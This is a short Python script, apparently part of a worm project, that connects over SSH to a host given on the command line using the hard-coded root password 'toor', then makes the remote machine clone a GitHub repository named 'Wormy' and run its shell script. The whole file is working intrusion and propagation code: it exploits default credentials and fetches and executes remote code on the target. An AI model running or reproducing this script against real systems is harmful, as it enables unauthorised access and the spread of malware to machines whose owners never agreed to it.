#!/usr/bin/env python

import os
import sys
import paramiko
from shutil import copyfile
if __name__ == "__main__":
    password = 'toor'
    username = 'root'
    host = sys.argv[1]
    port = 22
    
        
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,username = username, password = password)
        stdin, stdout, stderr = client.exec_command("cd Documents\ngit clone https://github.com/Timothyyung/Wormy\ncd Wormy\n./mormysh.sh")
        print (stdout.read())
        
    finally:
        client.close()
            
